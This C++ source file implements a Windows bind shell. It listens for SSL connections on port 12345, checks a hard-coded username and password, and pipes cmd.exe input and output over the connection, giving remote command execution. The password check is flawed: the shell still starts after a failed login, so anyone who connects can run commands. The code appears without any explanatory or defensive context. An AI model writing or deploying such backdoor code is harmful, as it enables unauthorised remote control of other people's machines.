#include "generic/basic/interface.hpp"
#include "generic/container/interface.hpp"
#include "generic/io/interface.hpp"
#include "generic/math/interface.hpp"
// #include "specific/neural/interface.hpp"
// #include "specific/spirit/interface.hpp"
using namespace ap;

int main ( )
{
    while ( true )
    {
        let stream = ssl_stream();
        stream.listen("ssl://0.0.0.0:12345");
    
        let usr = views::binary_istream<char>(stream) | std::views::take_while([] (auto ch) { return ch != '\n'; }) | std::ranges::to<string>(); stream.get();
        let pwd = views::binary_istream<char>(stream) | std::views::take_while([] (auto ch) { return ch != '\n'; }) | std::ranges::to<string>(); stream.get();
        if ( usr != "anonymous" or pwd != "Yaw989800@6afed450" )
            stream.close();
        
        let executor = pipe_stream();
        executor.open("cmd.exe");
        
        let reader = std::execution::schedule(cpu::execution_context.get_scheduler())
                   | std::execution::then([&] { views::binary_istream<char>(executor) | std::ranges::to<views::binary_ostream<char>>(std::ref(stream)); });
        let writer = std::execution::schedule(cpu::execution_context.get_scheduler())
                   | std::execution::then([&] { views::binary_istream<char>(stream) | std::ranges::to<views::binary_ostream<char>>(std::ref(executor)); });
        std::execution::sync_wait(std::execution::when_all(reader, writer));
    }
}